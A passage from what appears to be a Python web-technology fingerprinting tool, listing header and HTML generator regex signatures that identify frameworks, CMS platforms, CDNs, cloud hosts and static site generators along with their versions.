                    'phalcon': {'name': 'Phalcon', 'category': 'backend_technologies', 'version_regex': r'Phalcon/(\d+\.\d+\.\d+)'},
                    'codeigniter': {'name': 'CodeIgniter', 'category': 'backend_technologies', 'version_regex': r'CodeIgniter/(\d+\.\d+\.\d+)'},
                    'cakephp': {'name': 'CakePHP', 'category': 'backend_technologies', 'version_regex': r'CakePHP/(\d+\.\d+\.\d+)'},
                    'yii': {'name': 'Yii Framework', 'category': 'backend_technologies', 'version_regex': r'Yii/(\d+\.\d+\.\d+)'},
                    'slim': {'name': 'Slim Framework', 'category': 'backend_technologies', 'version_regex': r'Slim/(\d+\.\d+\.\d+)'},
                    'lumen': {'name': 'Lumen', 'category': 'backend_technologies', 'version_regex': r'Lumen/(\d+\.\d+\.\d+)'},
                    'spiral': {'name': 'Spiral Framework', 'category': 'backend_technologies', 'version_regex': r'Spiral/(\d+\.\d+\.\d+)'},
                    'hyperf': {'name': 'Hyperf', 'category': 'backend_technologies', 'version_regex': r'Hyperf/(\d+\.\d+\.\d+)'},
                    'swoole': {'name': 'Swoole', 'category': 'backend_technologies', 'version_regex': r'Swoole/(\d+\.\d+\.\d+)'},
                    'workerman': {'name': 'Workerman', 'category': 'backend_technologies', 'version_regex': r'Workerman/(\d+\.\d+\.\d+)'},
                    'reactphp': {'name': 'ReactPHP', 'category': 'backend_technologies', 'version_regex': r'ReactPHP/(\d+\.\d+\.\d+)'},
                    'amphp': {'name': 'AmphP', 'category': 'backend_technologies', 'version_regex': r'AmphP/(\d+\.\d+\.\d+)'},
                    'quasar': {'name': 'Quasar', 'category': 'backend_technologies', 'version_regex': r'Quasar/(\d+\.\d+\.\d+)'},
                    'vert.x': {'name': 'Vert.x', 'category': 'backend_technologies', 'version_regex': r'Vert\.x/(\d+\.\d+\.\d+)'},
                    'micronaut': {'name': 'Micronaut', 'category': 'backend_technologies', 'version_regex': r'Micronaut/(\d+\.\d+\.\d+)'},
                    'quarkus': {'name': 'Quarkus', 'category': 'backend_technologies', 'version_regex': r'Quarkus/(\d+\.\d+\.\d+)'},
                    'helidon': {'name': 'Helidon', 'category': 'backend_technologies', 'version_regex': r'Helidon/(\d+\.\d+\.\d+)'},
                    'javalin': {'name': 'Javalin', 'category': 'backend_technologies', 'version_regex': r'Javalin/(\d+\.\d+\.\d+)'},
                    'spark': {'name': 'Spark Framework', 'category': 'backend_technologies', 'version_regex': r'Spark/(\d+\.\d+\.\d+)'},
                    'dropwizard': {'name': 'Dropwizard', 'category': 'backend_technologies', 'version_regex': r'Dropwizard/(\d+\.\d+\.\d+)'},
                    'play': {'name': 'Play Framework', 'category': 'backend_technologies', 'version_regex': r'Play/(\d+\.\d+\.\d+)'},
                    'akka': {'name': 'Akka HTTP', 'category': 'backend_technologies', 'version_regex': r'Akka/(\d+\.\d+\.\d+)'},
                    'lift': {'name': 'Lift', 'category': 'backend_technologies', 'version_regex': r'Lift/(\d+\.\d+\.\d+)'},
                    'finch': {'name': 'Finch', 'category': 'backend_technologies', 'version_regex': r'Finch/(\d+\.\d+\.\d+)'},
                    'http4s': {'name': 'http4s', 'category': 'backend_technologies', 'version_regex': r'http4s/(\d+\.\d+\.\d+)'},
                    'tapir': {'name': 'Tapir', 'category': 'backend_technologies', 'version_regex': r'Tapir/(\d+\.\d+\.\d+)'},
                    'ktor': {'name': 'Ktor', 'category': 'backend_technologies', 'version_regex': r'Ktor/(\d+\.\d+\.\d+)'},
                    'springboot': {'name': 'Spring Boot', 'category': 'backend_technologies', 'version_regex': r'Spring Boot/(\d+\.\d+\.\d+)'},
                    'struts': {'name': 'Apache Struts', 'category': 'backend_technologies', 'version_regex': r'Struts/(\d+\.\d+\.\d+)'},
                    'jsf': {'name': 'JavaServer Faces', 'category': 'backend_technologies', 'version_regex': r'JSF/(\d+\.\d+\.\d+)'},
                    'wicket': {'name': 'Apache Wicket', 'category': 'backend_technologies', 'version_regex': r'Wicket/(\d+\.\d+\.\d+)'},
                    'grails': {'name': 'Grails', 'category': 'backend_technologies', 'version_regex': r'Grails/(\d+\.\d+\.\d+)'},
                    'ratpack': {'name': 'Ratpack', 'category': 'backend_technologies', 'version_regex': r'Ratpack/(\d+\.\d+\.\d+)'},
                    'deno': {'name': 'Deno', 'category': 'backend_technologies', 'version_regex': r'Deno/(\d+\.\d+\.\d+)'},
                    'bun': {'name': 'Bun', 'category': 'backend_technologies', 'version_regex': r'Bun/(\d+\.\d+\.\d+)'},
                    'fresh': {'name': 'Fresh', 'category': 'backend_technologies', 'version_regex': r'Fresh/(\d+\.\d+\.\d+)'},
                    'oak': {'name': 'Oak', 'category': 'backend_technologies', 'version_regex': r'Oak/(\d+\.\d+\.\d+)'},
                    'aleph': {'name': 'Aleph.js', 'category': 'backend_technologies', 'version_regex': r'Aleph/(\d+\.\d+\.\d+)'},
                    'ultra': {'name': 'Ultra', 'category': 'backend_technologies', 'version_regex': r'Ultra/(\d+\.\d+\.\d+)'},
                    'dotnet': {'name': '.NET', 'category': 'backend_technologies', 'version_regex': r'\.NET/(\d+\.\d+\.\d+)'},
                    'core': {'name': '.NET Core', 'category': 'backend_technologies', 'version_regex': r'\.NET Core/(\d+\.\d+\.\d+)'},
                    'nancy': {'name': 'Nancy', 'category': 'backend_technologies', 'version_regex': r'Nancy/(\d+\.\d+\.\d+)'},
                    'servicestack': {'name': 'ServiceStack', 'category': 'backend_technologies', 'version_regex': r'ServiceStack/(\d+\.\d+\.\d+)'},
                    'carter': {'name': 'Carter', 'category': 'backend_technologies', 'version_regex': r'Carter/(\d+\.\d+\.\d+)'},
                    'minimal': {'name': 'Minimal APIs', 'category': 'backend_technologies', 'version_regex': None},
                    'blazor': {'name': 'Blazor', 'category': 'backend_technologies', 'version_regex': r'Blazor/(\d+\.\d+\.\d+)'},
                    'umbraco': {'name': 'Umbraco', 'category': 'cms_platforms', 'version_regex': r'Umbraco/(\d+\.\d+\.\d+)'},
                    'orchard': {'name': 'Orchard', 'category': 'cms_platforms', 'version_regex': r'Orchard/(\d+\.\d+\.\d+)'},
                    'kentico': {'name': 'Kentico', 'category': 'cms_platforms', 'version_regex': r'Kentico/(\d+\.\d+\.\d+)'},
                    'sitecore': {'name': 'Sitecore', 'category': 'cms_platforms', 'version_regex': r'Sitecore/(\d+\.\d+\.\d+)'},
                    'episerver': {'name': 'Episerver', 'category': 'cms_platforms', 'version_regex': r'Episerver/(\d+\.\d+\.\d+)'},
                    'optimizely': {'name': 'Optimizely', 'category': 'cms_platforms', 'version_regex': r'Optimizely/(\d+\.\d+\.\d+)'},
                    'dotcms': {'name': 'dotCMS', 'category': 'cms_platforms', 'version_regex': r'dotCMS/(\d+\.\d+\.\d+)'},
                    'sitefinity': {'name': 'Sitefinity', 'category': 'cms_platforms', 'version_regex': r'Sitefinity/(\d+\.\d+\.\d+)'},
                    'dnn': {'name': 'DNN', 'category': 'cms_platforms', 'version_regex': r'DNN/(\d+\.\d+\.\d+)'},
                    'nopcommerce': {'name': 'nopCommerce', 'category': 'cms_platforms', 'version_regex': r'nopCommerce/(\d+\.\d+\.\d+)'},
                    'grandnode': {'name': 'GrandNode', 'category': 'cms_platforms', 'version_regex': r'GrandNode/(\d+\.\d+\.\d+)'},
                    'smartstore': {'name': 'SmartStore', 'category': 'cms_platforms', 'version_regex': r'SmartStore/(\d+\.\d+\.\d+)'},
                    'virtocommerce': {'name': 'Virto Commerce', 'category': 'cms_platforms', 'version_regex': r'Virto Commerce/(\d+\.\d+\.\d+)'}
                },
                'X-Generator': {
                    'drupal': {'name': 'Drupal', 'category': 'cms_platforms', 'version_regex': r'Drupal (\d+\.\d+)'},
                    'joomla': {'name': 'Joomla', 'category': 'cms_platforms', 'version_regex': r'Joomla! (\d+\.\d+\.\d+)'},
                    'gatsby': {'name': 'Gatsby', 'category': 'frontend_frameworks', 'version_regex': r'Gatsby (\d+\.\d+\.\d+)'},
                    'shopify': {'name': 'Shopify', 'category': 'cms_platforms', 'version_regex': None},
                    'squarespace': {'name': 'Squarespace', 'category': 'cms_platforms', 'version_regex': None},
                    'wix': {'name': 'Wix', 'category': 'cms_platforms', 'version_regex': None},
                    'ghost': {'name': 'Ghost', 'category': 'cms_platforms', 'version_regex': r'Ghost/(\d+\.\d+)'},
                    'magento': {'name': 'Magento', 'category': 'cms_platforms', 'version_regex': r'Magento/(\d+\.\d+)'}
                },
                'X-Drupal-Cache': {
                    'hit': {'name': 'Drupal', 'category': 'cms_platforms', 'version_regex': None},
                    'miss': {'name': 'Drupal', 'category': 'cms_platforms', 'version_regex': None}
                },
                'X-Shopify-Stage': {
                    'production': {'name': 'Shopify', 'category': 'cms_platforms', 'version_regex': None}
                },
                'cf-ray': {
                    '*': {'name': 'Cloudflare', 'category': 'cdn_services', 'version_regex': None}
                },
                'x-amz-cf-id': {
                    '*': {'name': 'Amazon CloudFront', 'category': 'cdn_services', 'version_regex': None}
                },
                'x-goog-server': {
                    '*': {'name': 'Google Cloud', 'category': 'cloud_services', 'version_regex': None}
                },
                'x-azure-ref': {
                    '*': {'name': 'Microsoft Azure', 'category': 'cloud_services', 'version_regex': None}
                },
                'via': {
                    'heroku': {'name': 'Heroku', 'category': 'cloud_services', 'version_regex': None}
                },
                'x-vercel-id': {
                    '*': {'name': 'Vercel', 'category': 'cloud_services', 'version_regex': None}
                },
                'x-nf-request-id': {
                    '*': {'name': 'Netlify', 'category': 'cloud_services', 'version_regex': None}
                },
                'x-amz-bucket-region': {
                    '*': {'name': 'AWS S3', 'category': 'cloud_services', 'version_regex': None}
                },
                'x-cache': {
                    'cloudfront': {'name': 'AWS CloudFront', 'category': 'cdn_services', 'version_regex': None}
                }
            },
            
            'html_patterns': {
                # Meta tags
                'generator': {
                    # WordPress Ecosystem
                    r'wordpress (\d+\.\d+\.\d+)': {'name': 'WordPress', 'category': 'cms_platforms'},
                    r'wp (\d+\.\d+\.\d+)': {'name': 'WordPress', 'category': 'cms_platforms'},
                    r'wordpresscom': {'name': 'WordPress.com', 'category': 'cms_platforms'},
                    r'wordpress\.com': {'name': 'WordPress.com', 'category': 'cms_platforms'},
                    r'wpengine': {'name': 'WP Engine', 'category': 'cms_platforms'},
                    r'kinsta': {'name': 'Kinsta', 'category': 'cms_platforms'},
                    r'wp-rocket': {'name': 'WP Rocket', 'category': 'cms_platforms'},
                    r'elementor (\d+\.\d+\.\d+)': {'name': 'Elementor', 'category': 'cms_platforms'},
                    r'divi (\d+\.\d+\.\d+)': {'name': 'Divi', 'category': 'cms_platforms'},
                    r'beaver builder': {'name': 'Beaver Builder', 'category': 'cms_platforms'},
                    r'visual composer': {'name': 'Visual Composer', 'category': 'cms_platforms'},
                    r'gutenberg (\d+\.\d+\.\d+)': {'name': 'Gutenberg', 'category': 'cms_platforms'},
                    r'wpbakery': {'name': 'WPBakery', 'category': 'cms_platforms'},
                    r'oxygen (\d+\.\d+\.\d+)': {'name': 'Oxygen Builder', 'category': 'cms_platforms'},
                    r'brizy': {'name': 'Brizy', 'category': 'cms_platforms'},
                    r'themify': {'name': 'Themify', 'category': 'cms_platforms'},
                    r'astra (\d+\.\d+\.\d+)': {'name': 'Astra Theme', 'category': 'cms_platforms'},
                    r'generatepress': {'name': 'GeneratePress', 'category': 'cms_platforms'},
                    r'oceanwp': {'name': 'OceanWP', 'category': 'cms_platforms'},
                    r'storefront': {'name': 'Storefront', 'category': 'cms_platforms'},
                    r'twentytwentythree': {'name': 'Twenty Twenty-Three', 'category': 'cms_platforms'},
                    r'twentytwentytwo': {'name': 'Twenty Twenty-Two', 'category': 'cms_platforms'},
                    r'twentytwentyone': {'name': 'Twenty Twenty-One', 'category': 'cms_platforms'},
                    r'twentytwenty': {'name': 'Twenty Twenty', 'category': 'cms_platforms'},
                    r'avada': {'name': 'Avada', 'category': 'cms_platforms'},
                    r'enfold': {'name': 'Enfold', 'category': 'cms_platforms'},
                    r'the7': {'name': 'The7', 'category': 'cms_platforms'},
                    r'betheme': {'name': 'BeTheme', 'category': 'cms_platforms'},
                    r'flatsome': {'name': 'Flatsome', 'category': 'cms_platforms'},
                    
                    # Drupal Ecosystem
                    r'drupal (\d+)': {'name': 'Drupal', 'category': 'cms_platforms'},
                    r'drupal (\d+\.\d+)': {'name': 'Drupal', 'category': 'cms_platforms'},
                    r'drupal (\d+\.\d+\.\d+)': {'name': 'Drupal', 'category': 'cms_platforms'},
                    r'acquia': {'name': 'Acquia', 'category': 'cms_platforms'},
                    r'pantheon': {'name': 'Pantheon', 'category': 'cms_platforms'},
                    
                    # Joomla Ecosystem
                    r'joomla! (\d+\.\d+\.\d+)': {'name': 'Joomla', 'category': 'cms_platforms'},
                    r'joomla (\d+\.\d+\.\d+)': {'name': 'Joomla', 'category': 'cms_platforms'},
                    r'joomla!': {'name': 'Joomla', 'category': 'cms_platforms'},
                    r'joomla': {'name': 'Joomla', 'category': 'cms_platforms'},
                    r'joomlatools': {'name': 'Joomlatools', 'category': 'cms_platforms'},
                    r'rockettheme': {'name': 'RocketTheme', 'category': 'cms_platforms'},
                    r'gavick': {'name': 'GavickPro', 'category': 'cms_platforms'},
                    r'yootheme': {'name': 'YOOtheme', 'category': 'cms_platforms'},
                    r'joomlart': {'name': 'JoomlaArt', 'category': 'cms_platforms'},
                    r'virtuemart': {'name': 'VirtueMart', 'category': 'cms_platforms'},
                    r'hikashop': {'name': 'HikaShop', 'category': 'cms_platforms'},
                    r'redshop': {'name': 'redSHOP', 'category': 'cms_platforms'},
                    r'mijoshop': {'name': 'MijoShop', 'category': 'cms_platforms'},
                    
                    # E-commerce Platforms
                    r'magento (\d+\.\d+)': {'name': 'Magento', 'category': 'cms_platforms'},
                    r'magento (\d+\.\d+\.\d+)': {'name': 'Magento', 'category': 'cms_platforms'},
                    r'magento': {'name': 'Magento', 'category': 'cms_platforms'},
                    r'adobe commerce': {'name': 'Adobe Commerce', 'category': 'cms_platforms'},
                    r'shopify': {'name': 'Shopify', 'category': 'cms_platforms'},
                    r'shopify plus': {'name': 'Shopify Plus', 'category': 'cms_platforms'},
                    r'bigcommerce': {'name': 'BigCommerce', 'category': 'cms_platforms'},
                    r'woocommerce (\d+\.\d+\.\d+)': {'name': 'WooCommerce', 'category': 'cms_platforms'},
                    r'woocommerce': {'name': 'WooCommerce', 'category': 'cms_platforms'},
                    r'prestashop (\d+\.\d+\.\d+)': {'name': 'PrestaShop', 'category': 'cms_platforms'},
                    r'prestashop': {'name': 'PrestaShop', 'category': 'cms_platforms'},
                    r'opencart (\d+\.\d+\.\d+)': {'name': 'OpenCart', 'category': 'cms_platforms'},
                    r'opencart': {'name': 'OpenCart', 'category': 'cms_platforms'},
                    r'oscommerce': {'name': 'osCommerce', 'category': 'cms_platforms'},
                    r'zen cart': {'name': 'Zen Cart', 'category': 'cms_platforms'},
                    r'zencart': {'name': 'Zen Cart', 'category': 'cms_platforms'},
                    r'cubecart': {'name': 'CubeCart', 'category': 'cms_platforms'},
                    r'xcart': {'name': 'X-Cart', 'category': 'cms_platforms'},
                    r'cs-cart': {'name': 'CS-Cart', 'category': 'cms_platforms'},
                    r'cscart': {'name': 'CS-Cart', 'category': 'cms_platforms'},
                    r'loaded commerce': {'name': 'Loaded Commerce', 'category': 'cms_platforms'},
                    r'ubercart': {'name': 'Ubercart', 'category': 'cms_platforms'},
                    r'drupal commerce': {'name': 'Drupal Commerce', 'category': 'cms_platforms'},
                    r'spree commerce': {'name': 'Spree Commerce', 'category': 'cms_platforms'},
                    r'solidus': {'name': 'Solidus', 'category': 'cms_platforms'},
                    r'sylius': {'name': 'Sylius', 'category': 'cms_platforms'},
                    r'akeneo': {'name': 'Akeneo', 'category': 'cms_platforms'},
                    r'pimcore': {'name': 'Pimcore', 'category': 'cms_platforms'},
                    r'bagisto': {'name': 'Bagisto', 'category': 'cms_platforms'},
                    r'medusajs': {'name': 'Medusa', 'category': 'cms_platforms'},
                    r'vendure': {'name': 'Vendure', 'category': 'cms_platforms'},
                    r'saleor': {'name': 'Saleor', 'category': 'cms_platforms'},
                    r'reaction commerce': {'name': 'Reaction Commerce', 'category': 'cms_platforms'},
                    r'commercejs': {'name': 'Commerce.js', 'category': 'cms_platforms'},
                    r'snipcart': {'name': 'Snipcart', 'category': 'cms_platforms'},
                    r'foxy': {'name': 'Foxy.io', 'category': 'cms_platforms'},
                    
                    # Headless/Modern CMS
                    r'strapi (\d+\.\d+\.\d+)': {'name': 'Strapi', 'category': 'cms_platforms'},
                    r'strapi': {'name': 'Strapi', 'category': 'cms_platforms'},
                    r'contentful': {'name': 'Contentful', 'category': 'cms_platforms'},
                    r'sanity': {'name': 'Sanity', 'category': 'cms_platforms'},
                    r'forestry': {'name': 'Forestry', 'category': 'cms_platforms'},
                    r'netlify cms': {'name': 'Netlify CMS', 'category': 'cms_platforms'},
                    r'decap cms': {'name': 'Decap CMS', 'category': 'cms_platforms'},
                    r'tinacms': {'name': 'TinaCMS', 'category': 'cms_platforms'},
                    r'ghost (\d+\.\d+)': {'name': 'Ghost', 'category': 'cms_platforms'},
                    r'ghost': {'name': 'Ghost', 'category': 'cms_platforms'},
                    r'butter cms': {'name': 'ButterCMS', 'category': 'cms_platforms'},
                    r'cosmic': {'name': 'Cosmic', 'category': 'cms_platforms'},
                    r'directus': {'name': 'Directus', 'category': 'cms_platforms'},
                    r'keystone': {'name': 'KeystoneJS', 'category': 'cms_platforms'},
                    r'keystonejs': {'name': 'KeystoneJS', 'category': 'cms_platforms'},
                    r'payload': {'name': 'Payload CMS', 'category': 'cms_platforms'},
                    r'payload cms': {'name': 'Payload CMS', 'category': 'cms_platforms'},
                    r'webiny': {'name': 'Webiny', 'category': 'cms_platforms'},
                    r'tina': {'name': 'TinaCMS', 'category': 'cms_platforms'},
                    r'builder.io': {'name': 'Builder.io', 'category': 'cms_platforms'},
                    r'storyblok': {'name': 'Storyblok', 'category': 'cms_platforms'},
                    r'prismic': {'name': 'Prismic', 'category': 'cms_platforms'},
                    r'dato cms': {'name': 'DatoCMS', 'category': 'cms_platforms'},
                    r'datocms': {'name': 'DatoCMS', 'category': 'cms_platforms'},
                    r'cockpit': {'name': 'Cockpit CMS', 'category': 'cms_platforms'},
                    r'craftcms': {'name': 'Craft CMS', 'category': 'cms_platforms'},
                    r'craft cms': {'name': 'Craft CMS', 'category': 'cms_platforms'},
                    r'silverstripe': {'name': 'SilverStripe', 'category': 'cms_platforms'},
                    r'textpattern': {'name': 'Textpattern', 'category': 'cms_platforms'},
                    r'concrete5': {'name': 'Concrete5', 'category': 'cms_platforms'},
                    r'concrete cms': {'name': 'Concrete CMS', 'category': 'cms_platforms'},
                    r'modx': {'name': 'MODX', 'category': 'cms_platforms'},
                    r'typo3': {'name': 'TYPO3', 'category': 'cms_platforms'},
                    r'bolt': {'name': 'Bolt CMS', 'category': 'cms_platforms'},
                    r'bolt cms': {'name': 'Bolt CMS', 'category': 'cms_platforms'},
                    r'october': {'name': 'October CMS', 'category': 'cms_platforms'},
                    r'october cms': {'name': 'October CMS', 'category': 'cms_platforms'},
                    r'winter cms': {'name': 'Winter CMS', 'category': 'cms_platforms'},
                    r'wintercms': {'name': 'Winter CMS', 'category': 'cms_platforms'},
                    r'statamic': {'name': 'Statamic', 'category': 'cms_platforms'},
                    r'kirby': {'name': 'Kirby', 'category': 'cms_platforms'},
                    r'grav': {'name': 'Grav', 'category': 'cms_platforms'},
                    r'pico': {'name': 'Pico CMS', 'category': 'cms_platforms'},
                    r'pico cms': {'name': 'Pico CMS', 'category': 'cms_platforms'},
                    r'getgrav': {'name': 'Grav', 'category': 'cms_platforms'},
                    r'processwire': {'name': 'ProcessWire', 'category': 'cms_platforms'},
                    r'pagekit': {'name': 'Pagekit', 'category': 'cms_platforms'},
                    r'neos': {'name': 'Neos CMS', 'category': 'cms_platforms'},
                    r'neos cms': {'name': 'Neos CMS', 'category': 'cms_platforms'},
                    r'wagtail': {'name': 'Wagtail', 'category': 'cms_platforms'},
                    r'django cms': {'name': 'Django CMS', 'category': 'cms_platforms'},
                    r'djangocms': {'name': 'Django CMS', 'category': 'cms_platforms'},
                    r'mezzanine': {'name': 'Mezzanine', 'category': 'cms_platforms'},
                    r'feincms': {'name': 'FeinCMS', 'category': 'cms_platforms'},
                    r'fein cms': {'name': 'FeinCMS', 'category': 'cms_platforms'},
                    r'oscar': {'name': 'Oscar', 'category': 'cms_platforms'},
                    r'django-oscar': {'name': 'Oscar', 'category': 'cms_platforms'},
                    r'modoboa': {'name': 'Modoboa', 'category': 'cms_platforms'},
                    r'plone': {'name': 'Plone', 'category': 'cms_platforms'},
                    r'zope': {'name': 'Zope', 'category': 'cms_platforms'},
                    r'pyramid': {'name': 'Pyramid', 'category': 'cms_platforms'},
                    r'turbogears': {'name': 'TurboGears', 'category': 'cms_platforms'},
                    
                    # Website Builders
                    r'squarespace': {'name': 'Squarespace', 'category': 'cms_platforms'},
                    r'wix': {'name': 'Wix', 'category': 'cms_platforms'},
                    r'weebly': {'name': 'Weebly', 'category': 'cms_platforms'},
                    r'webflow': {'name': 'Webflow', 'category': 'cms_platforms'},
                    r'jimdo': {'name': 'Jimdo', 'category': 'cms_platforms'},
                    r'strikingly': {'name': 'Strikingly', 'category': 'cms_platforms'},
                    r'carrd': {'name': 'Carrd', 'category': 'cms_platforms'},
                    r'tilda': {'name': 'Tilda', 'category': 'cms_platforms'},
                    r'readymag': {'name': 'Readymag', 'category': 'cms_platforms'},
                    r'format': {'name': 'Format', 'category': 'cms_platforms'},
                    r'portfolio': {'name': 'Portfolio', 'category': 'cms_platforms'},
                    r'carbonmade': {'name': 'Carbonmade', 'category': 'cms_platforms'},
                    r'behance': {'name': 'Behance', 'category': 'cms_platforms'},
                    r'dribbble': {'name': 'Dribbble', 'category': 'cms_platforms'},
                    r'adobe portfolio': {'name': 'Adobe Portfolio', 'category': 'cms_platforms'},
                    r'myportfolio': {'name': 'Adobe Portfolio', 'category': 'cms_platforms'},
                    r'zyro': {'name': 'Zyro', 'category': 'cms_platforms'},
                    r'hostinger': {'name': 'Hostinger Website Builder', 'category': 'cms_platforms'},
                    r'godaddy': {'name': 'GoDaddy Website Builder', 'category': 'cms_platforms'},
                    r'ionos': {'name': 'IONOS Website Builder', 'category': 'cms_platforms'},
                    r'1&1': {'name': '1&1 Website Builder', 'category': 'cms_platforms'},
                    r'site123': {'name': 'SITE123', 'category': 'cms_platforms'},
                    r'yola': {'name': 'Yola', 'category': 'cms_platforms'},
                    r'zoho sites': {'name': 'Zoho Sites', 'category': 'cms_platforms'},
                    r'duda': {'name': 'Duda', 'category': 'cms_platforms'},
                    r'ucraft': {'name': 'uCraft', 'category': 'cms_platforms'},
                    r'ukit': {'name': 'uKit', 'category': 'cms_platforms'},
                    r'mozello': {'name': 'Mozello', 'category': 'cms_platforms'},
                    r'webnode': {'name': 'Webnode', 'category': 'cms_platforms'},
                    r'webstarts': {'name': 'WebStarts', 'category': 'cms_platforms'},
                    r'websitebuilder': {'name': 'Website Builder', 'category': 'cms_platforms'},
                    r'websitetonight': {'name': 'Website Tonight', 'category': 'cms_platforms'},
                    r'imcreator': {'name': 'IM Creator', 'category': 'cms_platforms'},
                    r'sitebuilder': {'name': 'SiteBuilder', 'category': 'cms_platforms'},
                    r'simplebusiness': {'name': 'SimpleBusiness', 'category': 'cms_platforms'},
                    r'quicksites': {'name': 'QuickSites', 'category': 'cms_platforms'},
                    r'brandyourself': {'name': 'BrandYourself', 'category': 'cms_platforms'},
                    r'about.me': {'name': 'About.me', 'category': 'cms_platforms'},
                    r'linktree': {'name': 'Linktree', 'category': 'cms_platforms'},
                    r'linktr.ee': {'name': 'Linktree', 'category': 'cms_platforms'},
                    r'bio.link': {'name': 'Bio.link', 'category': 'cms_platforms'},
                    r'beacons.ai': {'name': 'Beacons', 'category': 'cms_platforms'},
                    r'koji': {'name': 'Koji', 'category': 'cms_platforms'},
                    
                    # Static Site Generators
                    r'gatsby (\d+\.\d+\.\d+)': {'name': 'Gatsby', 'category': 'frontend_frameworks'},
                    r'gatsby': {'name': 'Gatsby', 'category': 'frontend_frameworks'},
                    r'next\.js (\d+\.\d+\.\d+)': {'name': 'Next.js', 'category': 'frontend_frameworks'},
                    r'nextjs (\d+\.\d+\.\d+)': {'name': 'Next.js', 'category': 'frontend_frameworks'},
                    r'next js': {'name': 'Next.js', 'category': 'frontend_frameworks'},
                    r'nuxt\.js (\d+\.\d+\.\d+)': {'name': 'Nuxt.js', 'category': 'frontend_frameworks'},
                    r'nuxtjs (\d+\.\d+\.\d+)': {'name': 'Nuxt.js', 'category': 'frontend_frameworks'},
                    r'nuxt js': {'name': 'Nuxt.js', 'category': 'frontend_frameworks'},
                    r'hugo (\d+\.\d+\.\d+)': {'name': 'Hugo', 'category': 'development_tools'},
                    r'hugo': {'name': 'Hugo', 'category': 'development_tools'},
                    r'jekyll (\d+\.\d+\.\d+)': {'name': 'Jekyll', 'category': 'development_tools'},
                    r'jekyll': {'name': 'Jekyll', 'category': 'development_tools'},
                    r'eleventy (\d+\.\d+\.\d+)': {'name': 'Eleventy', 'category': 'development_tools'},
                    r'11ty (\d+\.\d+\.\d+)': {'name': 'Eleventy', 'category': 'development_tools'},
                    r'eleventy': {'name': 'Eleventy', 'category': 'development_tools'},
                    r'11ty': {'name': 'Eleventy', 'category': 'development_tools'},
                    r'gridsome (\d+\.\d+\.\d+)': {'name': 'Gridsome', 'category': 'development_tools'},
                    r'gridsome': {'name': 'Gridsome', 'category': 'development_tools'},
                    r'vuepress (\d+\.\d+\.\d+)': {'name': 'VuePress', 'category': 'development_tools'},
                    r'vuepress': {'name': 'VuePress', 'category': 'development_tools'},
                    r'vitepress (\d+\.\d+\.\d+)': {'name': 'VitePress', 'category': 'development_tools'},
                    r'vitepress': {'name': 'VitePress', 'category': 'development_tools'},
                    r'astro (\d+\.\d+\.\d+)': {'name': 'Astro', 'category': 'development_tools'},
                    r'astro': {'name': 'Astro', 'category': 'development_tools'},
                    r'sveltekit (\d+\.\d+\.\d+)': {'name': 'SvelteKit', 'category': 'development_tools'},
                    r'sveltekit': {'name': 'SvelteKit', 'category': 'development_tools'},
                    r'remix (\d+\.\d+\.\d+)': {'name': 'Remix', 'category': 'development_tools'},
                    r'remix': {'name': 'Remix', 'category': 'development_tools'},
                    r'hexo (\d+\.\d+\.\d+)': {'name': 'Hexo', 'category': 'development_tools'},
                    r'hexo': {'name': 'Hexo', 'category': 'development_tools'},
                    r'pelican (\d+\.\d+\.\d+)': {'name': 'Pelican', 'category': 'development_tools'},
                    r'pelican': {'name': 'Pelican', 'category': 'development_tools'},
                    r'sphinx (\d+\.\d+\.\d+)': {'name': 'Sphinx', 'category': 'development_tools'},
                    r'sphinx': {'name': 'Sphinx', 'category': 'development_tools'},
                    r'mkdocs (\d+\.\d+\.\d+)': {'name': 'MkDocs', 'category': 'development_tools'},
                    r'mkdocs': {'name': 'MkDocs', 'category': 'development_tools'},
                    r'gitbook': {'name': 'GitBook', 'category': 'development_tools'},
                    r'docsify': {'name': 'Docsify', 'category': 'development_tools'},
                    r'docusaurus (\d+\.\d+\.\d+)': {'name': 'Docusaurus', 'category': 'development_tools'},
                    r'docusaurus': {'name': 'Docusaurus', 'category': 'development_tools'},
                    r'bookdown': {'name': 'Bookdown', 'category': 'development_tools'},
                    r'quarto': {'name': 'Quarto', 'category': 'development_tools'},
                    r'r markdown': {'name': 'R Markdown', 'category': 'development_tools'},
                    r'rmarkdown': {'name': 'R Markdown', 'category': 'development_tools'},
                    r'zola (\d+\.\d+\.\d+)': {'name': 'Zola', 'category': 'development_tools'},
                    r'zola': {'name': 'Zola', 'category': 'development_tools'},
                    r'cobalt (\d+\.\d+\.\d+)': {'name': 'Cobalt', 'category': 'development_tools'},
                    r'cobalt': {'name': 'Cobalt', 'category': 'development_tools'},
                    r'middleman (\d+\.\d+\.\d+)': {'name': 'Middleman', 'category': 'development_tools'},
                    r'middleman': {'name': 'Middleman', 'category': 'development_tools'},
                    r'nanoc (\d+\.\d+\.\d+)': {'name': 'Nanoc', 'category': 'development_tools'},
                    r'nanoc': {'name': 'Nanoc', 'category': 'development_tools'},
                    r'bridgetown (\d+\.\d+\.\d+)': {'name': 'Bridgetown', 'category': 'development_tools'},
                    r'bridgetown': {'name': 'Bridgetown', 'category': 'development_tools'},
                    r'lume (\d+\.\d+\.\d+)': {'name': 'Lume', 'category': 'development_tools'},
                    r'lume': {'name': 'Lume', 'category': 'development_tools'},
                    r'franklin (\d+\.\d+\.\d+)': {'name': 'Franklin.jl', 'category': 'development_tools'},
                    r'franklin': {'name': 'Franklin.jl', 'category': 'development_tools'},
                    r'publii': {'name': 'Publii', 'category': 'development_tools'},
                    r'lektor': {'name': 'Lektor', 'category': 'development_tools'},
                    r'cactus': {'name': 'Cactus', 'category': 'development_tools'},
                    r'wintersmith': {'name': 'Wintersmith', 'category': 'development_tools'},
                    r'metalsmith': {'name': 'Metalsmith', 'category': 'development_tools'},
                    r'assemble': {'name': 'Assemble', 'category': 'development_tools'},
                    r'harp': {'name': 'Harp', 'category': 'development_tools'},
                    r'punch': {'name': 'Punch', 'category': 'development_tools'},
                    r'blacksmith': {'name': 'Blacksmith', 'category': 'development_tools'},
                    r'brunch': {'name': 'Brunch', 'category': 'development_tools'},
                    r'phenomic': {'name': 'Phenomic', 'category': 'development_tools'},
                    r'react-static': {'name': 'React Static', 'category': 'development_tools'},
                    r'gatsby-transformer': {'name': 'Gatsby', 'category': 'development_tools'},
                    r'gatsby-source': {'name': 'Gatsby', 'category': 'development_tools'},
                    r'next-mdx': {'name': 'Next.js MDX', 'category': 'development_tools'},
                    r'mdx': {'name': 'MDX', 'category': 'development_tools'},
                    r'contentlayer': {'name': 'Contentlayer', 'category': 'development_tools'},
